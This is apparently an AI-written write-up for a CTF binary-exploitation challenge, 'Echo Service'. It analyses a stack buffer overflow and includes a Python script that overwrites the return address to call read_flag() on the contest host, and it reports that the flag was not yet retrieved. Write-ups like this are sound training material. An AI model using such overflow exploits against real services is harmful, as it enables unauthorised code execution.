# Echo Service CTF Challenge Solution

## Challenge Overview
- **Service**: Echo Service
- **Host**: chals.uscc-cyberbowl-2025.ctf.institute
- **Port**: 3014
- **Type**: Binary Exploitation (Buffer Overflow)

## Vulnerability Analysis

### Binary Functions
Based on analysis of the provided ELF binary:

1. **vuln()** - Contains a buffer overflow vulnerability
   - Allocates 64-byte buffer on stack
   - Uses `fgets()` to read up to 200 bytes
   - This allows overwriting the return address

2. **read_flag()** - Reads and prints the flag
   - Opens `./flag` file
   - Reads contents
   - Prints flag to stdout

3. **main()** - Calls vuln() in an infinite loop

### Exploit Strategy

The exploit works by:
1. Sending 72 bytes of padding (64 bytes buffer + 8 bytes RBP)
2. Overwriting the return address with the address of `read_flag()`
3. When `vuln()` returns, it jumps to `read_flag()` instead

### Exploit Code

```python
#!/usr/bin/env python3

import socket
import struct

HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
PORT = 3014
READ_FLAG_ADDR = 0x11e9

# Create payload
payload = b'A' * 72  # Fill buffer + RBP
payload += struct.pack('<Q', READ_FLAG_ADDR)  # Overwrite return address

# Connect and exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(1024)  # Banner
s.sendall(payload + b'\n')
response = s.recv(4096)
print(response.decode())
s.close()
```

## Current Status

The exploit successfully overwrites the return address (confirmed by seeing the address bytes in the response), but the flag is not being returned. Possible issues:

1. **Remote binary has different addresses** - The read_flag function may be at a different address on the remote system
2. **Output buffering** - The flag output may not be flushed to the socket
3. **Process crashing** - The function may crash before completing
4. **Security protections** - ASLR, stack canaries, or other protections may be enabled

## Next Steps

To successfully exploit this challenge, you may need to:

1. **Get the actual binary** - Download the exact binary from the server to get correct addresses
2. **Try different addresses** - The remote binary compilation may have different offsets
3. **Use ROP chains** - Build a more sophisticated exploit with proper stack setup
4. **Handle output differently** - The flag may need to be extracted differently

## Files Created

- `solution.py` - Main exploit script
- `echo_svc.c` - Reconstructed source code
- `comprehensive_exploit.py` - Script that tries multiple approaches

## Usage

Run the exploit with:
```bash
python3 solution.py
```

---

**Note**: The exploit successfully demonstrates the buffer overflow vulnerability by overwriting the return address. The exact flag extraction may require the actual remote binary or additional information about the remote system configuration.
